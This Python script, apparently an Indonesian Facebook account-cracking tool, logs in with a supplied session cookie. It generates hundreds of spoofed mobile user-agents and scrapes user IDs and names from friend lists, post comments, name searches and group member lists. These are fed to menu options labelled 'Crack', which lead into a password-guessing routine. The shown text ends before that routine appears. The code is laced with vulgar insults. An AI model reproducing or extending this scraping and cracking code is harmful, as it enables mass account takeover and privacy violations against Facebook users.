#LuciverXploit
#Jang_Di_Recode_Bang
#Cie_Jadi_Premium
#Inget_Yang_Ori_Cuman_Punya_Gua
#Author_Sekarang_Modal_Banner_Awokawok
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
from rich.panel import Panel
from rich.tree import Tree
from rich import print as Recode_Mulu_Bang_Kasihan_Author
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
ses = requests.Session()
console = Console()
BEREM = "[#FF0000]" # WARNA BEREM NGENTOD
HEJO = "[#00FF00]" # WARNA HEJO NGENTOD
KONENG = "[#FFFF00]" # WARNA KONENG NGENTOD
BIRU = "[#00C8FF]" # WARNA BIRU NGENTOD
BODAS = "[#FFFFFF]" # WARNA BODAS NGENTOD
UNGU = "[#AF00FF]" # WARNA UNGU NGENTOD
OREN = "[#FF8F00]" # WARNA OREN NGENTOD
P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m" 
O = "\x1b[1;96m"
N = "\x1b[0m"    
Z = "\033[1;30m"
def Lempang_Hela(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.01) 
def Luciver_Wibu():
    animation = ["[\x1b[1;91m➢\x1b[0m⨳⨳⨳⨳⨳⨳⨳⨳⨳]","[\x1b[1;92m➢➢\x1b[0m⨳⨳⨳⨳⨳⨳⨳⨳]", "[\x1b[1;93m➢➢➢\x1b[0m⨳⨳⨳⨳⨳⨳⨳]", "[\x1b[1;94m➢➢➢➢\x1b[0m⨳⨳⨳⨳⨳⨳]", "[\x1b[1;95m➢➢➢➢➢\x1b[0m⨳⨳⨳⨳⨳]", "[\x1b[1;96m➢➢➢➢➢➢\x1b[0m⨳⨳⨳⨳]", "[\x1b[1;97m➢➢➢➢➢➢➢\x1b[0m⨳⨳⨳]", "[\x1b[1;98m➢➢➢➢➢➢➢➢\x1b[0m⨳⨳]", "[\x1b[1;99m➢➢➢➢➢➢➢➢➢\x1b[0m⨳]", "[\x1b[1;910m➢➢➢➢➢➢➢➢➢➢\x1b[0m]"]
    for i in range(50):
        time.sleep(0.5)
        sys.stdout.write(f"\r{N}[{H}×͜×{N}] SABAR TOD SEDANG DI BUKA SERVERNYA " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def Mode_Janda():
	os.system('clear')
def Waktunya_Untuk_Ngentod():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow
ayena = calendar.timegm(time.gmtime(time.time()))
ngumpulken_tai_munding = []
Aku_Ayah_Luciana = []
sys.stdout.write('\x1b]2; Script Ini Punya LuciverXploit\x07')
try:
	warna_color = open("data/theme_color","r").read()
	warna_tulisan_njing = warna_color.split("|")[0]
	warna_benget_sia_hideng = warna_color.split("|")[1]
except:
	warna_tulisan_njing = "[#00FF00]"
for Luciver_Ganteng_Banget in range(200):
	versi_android_sia_blog = str(random.randint(4,12))+".0.0"
	versi_chrome_sia_blog = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	device_hp_lu_kentang_bang = random.choice(["Nexus 5 Build/NHG47L","Nexus 7 Build/LMY47V","Nexus 5X Build/N4F26T","Nexus 6P Build/OPM5.171019.014","Nexus 5X Build/OPR6.170623.023","Nexus 6 Build/OPM5.171019.015","Nexus 5X Build/MMBIRU9K","Nexus 5X Build/OPM6.171019.030.H1","Lenovo TB-X704L Build/NMF26F","SM-N986U Build/RP1A.200720.012","Venue 7 3730 Build/KOT49H","Redmi Note 8 Pro Build/PPR1.180610.011","Note 7 Pro Build/PKQ1.181203.001","EML-L29 Build/HUAWEIEML-L29","vivo 1724 Build/OPM1.171019.011","MAR-LX1B Build/HUAWEIMAR-L21B","Redmi 4A Build/N2G47H","S2 Build/2.130VE.30.c","RMX1821 Build/QP1A.190711.020","SM-M146B Build/TP1A.220624.014","SM-M146B Build/TP1A.220624.014","SM-S908U Build/TP1A.220624.014","SM-M307F Build/RP1A.200720.012","SM-E135F Build/TP1A.220624.014","SM-G975F Build/QP1A.190711.020","SM-M326B Build/RP1A.200720.012","SM-A716U Build/TP1A.220624.014"])
	dev = device_hp_lu_kentang_bang.split(" Build/")[0]
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ucweb = random.choice(["Mozilla/5.0 (Linux; Android 9; moto g(8) power lite Build/POD29.349-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.101 Mobile Safari/537.36 AgentWeb/4.1.9 UCBrowser/11.6.4.950","UCWEB/2.0(Linux; U; Opera Mini/7.1.32052/30.3697; ar-SA; LT_9701 Build/SP1A.210812.016) UNGU/1.0.0 UCBrowser/13.6.0.1315 Mobile","UCWEB/2.0 (Linux; U; Android 4.4.4; zh-CN; HM NOTE 1LTETD) UNGU/1.0.0 UCBrowser/9.9.5.489 UNGU/1.0.0","UCWEB/2.0 (Linux; U; Android 4.4.4; zh-CN; HM NOTE 1LTETD) UNGU/1.0.0 UCBrowser/9.9.5.489 UNGU/1.0.0 Mobile","Opera/9.80 (Android; Opera Mini/7.28879/27.1662; U; en-us) Presto/2.8 Version/11.10 UCBrowser/8.6/145/33482","UCWEB/2.0 (MIDP-2.0; U; Adr 4.1.2; en-US; GT-S7262) UNGU/1.0.0 UCBrowser/10.1.2.571 UNGU/1.0.0","UCWEB/2.0 (MIDP-2.0; U; Adr 4.1.2; en-US; GT-S7262) UNGU/1.0.0 UCBrowser/10.1.2.571 UNGU/1.0.0 Mobile","Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 AgentWeb/4.1.9 UCBrowser/11.6.4.950","Mozilla/5.0 (Linux; U; Android 9; zh-CN; DUK-AL20 Build/HUAWEIDUK-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 UCBrowser/16.2.1.1272 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 6.0.1; de-DE; C1-U02 Build/ZJXOSOP5801805252S) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 14; en-US; SM-M336BU Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.6.0.1315 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 12; en-US; BEREM101K7AG Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.6.0.1315 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/21C66 UCBrowser/11.3.5.1203","UCWEB/2.0 (Windows; U; wds 8.0; vi; NOKIA; RM-998apacvietnam915) UNGU/1.0.0 UCBrowser/4.2.1.541 UNGU/1.0.0",
"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; Lenovo A806 Build/KOT49H) UNGU/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 4.4.2; Lenovo A806 Build/KOT49H) Mobile","Mozilla/5.0 (Linux; Android 5.1.1; SM-J320G Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMBIRU9M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 11; SM-A205F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCBrowser/11.5.2.1188(SpeedMode) U4/1.0 UCWEB/2.0","Mozilla/5.0 (Linux; Android 6.0.1; SM-G950N Build/MMBIRU9T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; U; Android 4.1.1; fr-fr; MI 2A Build/JRO03L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 11; RMX3430 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z010D Build/MMBIRU9P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188","UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; SM-G532G Build/MMBIRU9T) UNGU/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 6.0.1; SM-G532G Build/MMBIRU9T)","Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; GT-I9060 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMBIRU9T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 UCBrowser/11.3.0.1130",
"Mozilla/5.0 (Linux; Android 10; Redmi 7 Build/QKQ1.191008.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 8.1.0; itel P32 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; S5E Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.4.1.1138","Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 UCBrowser/11.4.0.1180","UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; US) UNGU/1.0.0 UCMini/11.5.2.1188 UNGU/1.0.0","Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 9; LT-NOTE 10S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 UCBrowser/11.4.1.1138","Mozilla/5.0 (Linux; Android 7.0; S40 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 7.0; IF9003 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 UCBrowser/11.5.3.1189","Mozilla/5.0 (Linux; Android 9; STG S30 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.75 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188","Mozilla/5.0 (Linux; Android 10; V2026 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 UCBrowser/11.5.2.1188"])
	Si_Anjing_Recode = f"{ucweb} [FBAN/MessengerLite;FBAV/{versi_chrome_sia_blog};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android_sia_blog};FBBK/1;FBOP/1;FBCA/arm64-v8a:;"
	if Si_Anjing_Recode in Aku_Ayah_Luciana:pass
	else:Aku_Ayah_Luciana.append(Si_Anjing_Recode)
class Logo:	
	def Hapus_Benget_Sia(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass	
	def Gambar_Kontol_Bapaklu(self):
		self.Hapus_Benget_Sia()
		Luciver_Wibu()
		self.Hapus_Benget_Sia()
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{warna_tulisan_njing} [bold red]● ● ●
      _____                                _____                             
  __| __  |__  ____  ____   _  ______  __|___  |__  ____    ______  ______  
 |  |/ /     ||    ||    \ | ||   ___||   ___|    ||    \  |   ___||   ___| 
 |     \     ||    ||     \| ||   |  ||   ___|    ||     \ |   |__ |   ___| {BODAS}
 |__|\__\  __||____||__/\____||______||___|     __||__|\__\|______||______| 
    |_____|                              |_____|                                                                                                                                                                                                                                              
                       {HEJO} 𝕄𝕒𝕕𝕖 𝔹𝕪 {BEREM}𝔸𝕣𝕚 𝕄𝕒𝕣𝕤𝕙𝕖𝕝𝕝𝕠 {BODAS}ℂ𝕠𝕕𝕖𝕣                                                     """,width=80,title=f"{KONENG} ×͜× {HEJO}{Waktunya_Untuk_Ngentod()} {KONENG}×͜× ",style=f"bold white"))
class Login:	
	def __init__(self):
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]	
	def menu_login_jangan_dioprek(self):		
		Logo().Gambar_Kontol_Bapaklu()
		Di_Hujat_Karna_Iri_Sudah_Biasa = []
		#bang = []
		self.menu = Console()
		self.tol = Console()
		Di_Hujat_Karna_Iri_Sudah_Biasa.append(Panel(f'{BODAS}[{HEJO}•{BODAS}]{BODAS}Nama    : {HEJO}LuciverXploit\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Github  : {HEJO}myLuciverXploit\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Negara  : {HEJO}{self.negara}\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Script  : {HEJO}Facebook Tools',width=40,padding=(0,2),title=f"{KONENG}✘ {HEJO}Pengguna {KONENG}✘",style=f"bold white"))
		Di_Hujat_Karna_Iri_Sudah_Biasa.append(Panel(f'{BODAS}[{HEJO}•{BODAS}]{BODAS}Lisensi : {HEJO}.*****.*...\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Join    : {HEJO}- -\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Tools   : {HEJO}Termux X Linux\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Premium : {BEREM}Not Detect',width=40,padding=(0,2),title=f"{KONENG}✘ {HEJO}Lisensi {KONENG}✘",style=f"bold white"))
		self.menu.print(Columns(Di_Hujat_Karna_Iri_Sudah_Biasa))
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}[{warna_tulisan_njing}01{BODAS}]. Login Dengan Cookie
[{warna_tulisan_njing}02{BODAS}]. Login {BEREM}Email Dan Password""",width=40,padding=(0,2),style=f"bold white"))
		login = console.input(f" {HEJO}• {BODAS}Pilih : ")
		if login in["1","01"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}Masukan Cookie Yang Baik Dan Benar Sesuaikan Akun Tumbal Dan Fresh""",width=80,style=f"bold white"))
			cookie = console.input(f" {HEJO}• {BODAS}Cookie: {HEJO}")
			#open("data/cookie","w").write(cookie)
			self.login_cokina_uy_didie(cookie)
		else:
			exit(Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BEREM} Fitur Belum Di Update""",width=80,style=f"bold white")))	
	def login_cokina_uy_didie(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BEREM}ᴄᴏᴏᴋɪᴇᴍᴜ ᴍᴏᴅᴀʀ ɢᴏʙʟᴏᴋ""",width=80,style=f"bold white"))
			sys.exit()	
	def Rubah_Bahasa_Tangkurak(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass
class Menu:	
	def __init__(self):
		self.men = []
		self.id = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]	
	def cek_login_atuh_bro(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
			nama = re.findall("<title>(.*?)</title>",url)[0]
			if "Konten Tidak Ditemukan" in nama:
				try:os.remove("data/cookie")
				except:pass
				Login().menu_login_jangan_dioprek()
			else:
				return nama
		except ConnectionError:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BEREM}ᴋᴏɴᴇᴋꜱɪ ᴊᴇʟᴇᴋ,ʜᴀʀᴀᴘ ᴅᴜᴅᴜᴋ ᴅɪ ᴀᴛᴀꜱ ᴛᴏᴡᴇʀ""",width=80,style=f"bold white"))
			exit()	
	def menu(self):		
		Logo().Gambar_Kontol_Bapaklu()		
		try:
			cok = open("data/cookie","r").read()
			cookie = {"cookie": cok}
			nama = self.cek_login_atuh_bro(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login_jangan_dioprek()		
		Ngaku_Author_Isinya_Alvino = []
		Ngentod_Dulu_Biar_Jago_Ngoding = []
		self.menu = Console()
		self.tol = Console()
		Ngaku_Author_Isinya_Alvino.append(Panel(f'{BODAS}[{HEJO}•{BODAS}]{BODAS}Nama    : {HEJO}{nama}\n{BODAS}[{HEJO}•{BODAS}]{BODAS}IP      : {HEJO}{self.ip}\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Negara  : {HEJO}{self.negara}\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Script  : {HEJO}Facebook Tools',width=40,padding=(0,2),title=f"{KONENG}✘ {HEJO}Pengguna {KONENG}✘",style=f"bold white"))
		Ngaku_Author_Isinya_Alvino.append(Panel(f'{BODAS}[{HEJO}•{BODAS}]{BODAS}Lisensi : {HEJO}.*****.*...\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Join    : {HEJO}- -\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Tools   : {HEJO}Termux X Linux\n{BODAS}[{HEJO}•{BODAS}]{BODAS}Premium : {BEREM}Not',width=40,padding=(0,2),title=f"{KONENG}✘ {HEJO}Lisensi {KONENG}✘",style=f"bold white"))
		self.menu.print(Columns(Ngaku_Author_Isinya_Alvino))
		Ngentod_Dulu_Biar_Jago_Ngoding.append(Panel(f"{BODAS}[{warna_tulisan_njing}01{BODAS}]. Crack Publik\n{BODAS}[{warna_tulisan_njing}02{BODAS}]. Crack Pengikut\n{BODAS}[{warna_tulisan_njing}03{BODAS}]. Crack Komentar\n{BODAS}[{warna_tulisan_njing}04{BODAS}]. Crack Random Email",width=40,padding=(0,2),style=f"bold white"))
		Ngentod_Dulu_Biar_Jago_Ngoding.append(Panel(f"{BODAS}[{warna_tulisan_njing}05{BODAS}]. Crack Random Username\n{BODAS}[{warna_tulisan_njing}06{BODAS}]. Crack Pencarian Nama\n{BODAS}[{warna_tulisan_njing}07{BODAS}]. Crack Member Group\n{BODAS}[{warna_tulisan_njing}08{BODAS}]. Logout",width=40,padding=(0,2),style=f"bold white"))
		self.tol.print(Columns(Ngentod_Dulu_Biar_Jago_Ngoding))
		munding_endogan_kalur_naga = console.input(f" {HEJO}➢ {BODAS}pilih menu : ")		
		if munding_endogan_kalur_naga in["1","01"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""          {BODAS}Silahkan Masukan UID Target Yang Sesuai Dan Tidak Private""",subtitle=f"{BODAS}Ketik {HEJO}Ainx{BODAS} Untuk Dump Pertemanan Sendiri ",width=80,style=f"bold white"))
			user = console.input(f" {HEJO}• {BODAS}Masukan UID : ")
			if user in["Ainx","ainx"]:
				user = Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik_Boskuh(f"https://mbasic.facebook.com/{user}?v=friends")
			Crack().atur_sandi_biar_ganteng_kek_gua()		
		elif munding_endogan_kalur_naga in["3","03"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"bold white"))
			user = console.input(f" {HEJO}• {BODAS}masukan id postingan : ")
			Dump(cookie).Dump_Komentar_Uy(f"https://mbasic.facebook.com/{user}")
			Crack().atur_sandi_biar_ganteng_kek_gua()		
		elif munding_endogan_kalur_naga in["4","04"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"bold white"))
			user = console.input(f" {HEJO}• {BODAS}masukan nama : ")
			format = console.input(f" {HEJO}• {BODAS}masukan format : ")
			limit = console.input(f" {HEJO}• {BODAS}masukan limit : ")
			Dump(cookie).Dump_Email_Tersakiti_Luciver(user,format,limit)
			Crack().atur_sandi_biar_ganteng_kek_gua()		
		elif munding_endogan_kalur_naga in["5","05"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"bold white"))
			user = console.input(f" {HEJO}• {BODAS}masukan nama : ")
			limit = console.input(f" {HEJO}• {BODAS}masukan limit : ")
			Dump(cookie).Dump_Username_Musuh_Kamu(user,limit)
			Crack().atur_sandi_biar_ganteng_kek_gua()		
		elif munding_endogan_kalur_naga in["6","06"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"bold white"))
			user = console.input(f" {HEJO}• {BODAS}masukan nama : ")
			common = open("asset/nama_indonesia","r").read().splitlines()
			for idt in user.split(","):
				self.id.append(idt)
				for people in common:
					self.id.append(people+" "+idt)
			try:
				for gas in self.id:
					Dump(cookie).Dump_Pencarian_Mantan_Yang_Hilang(f"https://mbasic.facebook.com/public/{gas}")
			except:pass
			Crack().atur_sandi_biar_ganteng_kek_gua()		
		elif munding_endogan_kalur_naga in["7","07"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"bold white"))
			user = console.input(f" {HEJO}• {BODAS}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup_Ewean(f"https://mbasic.facebook.com/groups/{user}")
			Crack().atur_sandi_biar_ganteng_kek_gua()	
		elif munding_endogan_kalur_naga in["8","08"]:
			os.system("rm data/cookie")					
		else:
			exit(Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BEREM}sorry belum gua update""",width=80,style=f"bold white")))
class Dump:	
	def __init__(self,cookie):
		self.cookie = cookie	
	def GetUser(self):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
			uid = re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass	
	def Dump_Publik_Boskuh(self,url):
		try:
			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
					if uid+"✘"+nama in ngumpulken_tai_munding:pass
					else:ngumpulken_tai_munding.append(uid+"✘"+nama)
					console.print(f" {HEJO}• {BODAS}Proses Sukses, Berhasil ngumpulken_tai_munding {len(ngumpulken_tai_munding)} UID....", end="\r")
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik_Boskuh("https://mbasic.facebook.com/"+x.get("href"))
		except:pass	
	def Dump_Komentar_Uy(self,url):
		try:
			data = parser(ses.get(url).text,"html.parser")
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
					nama = ids.text
					if uid+"✘"+nama in ngumpulken_tai_munding:pass
					else:ngumpulken_tai_munding.append(uid+"✘"+nama)
					console.print(f" {HEJO}• {BODAS}sedang proses mengumpulkan id, berhasil mendapatkan {len(ngumpulken_tai_munding)} id....", end="\r")
			for z in data.find_all("a",href=True):
				if "Lihat komentar sebelumnya…" in z.text:
					self.Dump_Komentar_Uy("https://mbasic.facebook.com"+z["href"])
		except:pass	
	def Dump_Pencarian_Mantan_Yang_Hilang(self,url):
		try:
			data = parser(ses.get(str(url)).text,'html.parser')
			for z in data.find_all("td"):
				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
				for uid,nama in namp:
					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
					if uid+"✘"+nama in ngumpulken_tai_munding:pass
					else:ngumpulken_tai_munding.append(uid+"✘"+nama)
					console.print(f" {HEJO}• {BODAS}sedang proses mengumpulkan id, berhasil mendapatkan {len(ngumpulken_tai_munding)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Hasil Selanjutnya" in x.text:
					self.Dump_Pencarian_Mantan_Yang_Hilang(x.get("href"))
		except:pass	
	def Dump_MemberGrup_Ewean(self,url):
		try:
			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
			judul = re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
					else:
						if ids.text==judul:pass
						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
					if uid+"✘"+nama in ngumpulken_tai_munding:pass
					else:ngumpulken_tai_munding.append(uid+"✘"+nama)
					console.print(f" {HEJO}• {BODAS}sedang proses mengumpulkan id, berhasil mendapatkan {len(ngumpulken_tai_munding)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup_Ewean("https://mbasic.facebook.com"+x.get("href"))
